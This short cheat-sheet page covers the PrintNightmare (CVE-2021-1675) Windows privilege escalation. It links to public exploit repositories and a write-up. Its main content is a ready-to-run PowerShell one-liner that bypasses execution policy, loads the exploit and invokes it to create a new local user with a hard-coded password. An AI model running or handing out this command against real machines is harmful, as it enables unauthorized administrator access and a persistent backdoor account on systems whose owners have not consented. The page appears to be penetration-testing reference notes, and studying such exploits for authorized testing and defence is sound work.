---
description: PrintNightmare Local / Remote Privilege Escalation
---

# print nightmare

## no DLL needed:

* [https://github.com/calebstewart/CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675)

```bash
# no DLLs needed
powershell.exe -exec bypass -Command "& {Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare -NewUser 'kashz' -NewPassword 'iamkashz@123'}"
```

## Needs DLL to compile

* [https://github.com/outflanknl/PrintNightmare](https://github.com/outflanknl/PrintNightmare)

## Reference

* [https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)